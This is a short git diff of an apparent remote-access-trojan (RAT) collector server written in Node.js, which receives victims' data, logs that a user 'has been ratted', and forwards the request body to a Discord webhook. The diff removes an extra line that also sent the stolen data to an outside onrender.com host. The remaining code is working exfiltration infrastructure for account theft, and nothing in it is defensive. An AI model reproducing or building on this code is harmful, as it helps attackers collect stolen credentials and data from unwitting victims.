@@ -171,15 +171,6 @@ app.post("/", (req, res) => {
                 }).catch(err => {
                     console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                 })
-                
-                post("https://ashification-kuh6.onrender.com", req.body
-                , {
-                    headers: {
-                        "Content-Type": "application/json"
-                    }
-                }).catch(err => {
-                    console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                })
             }
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
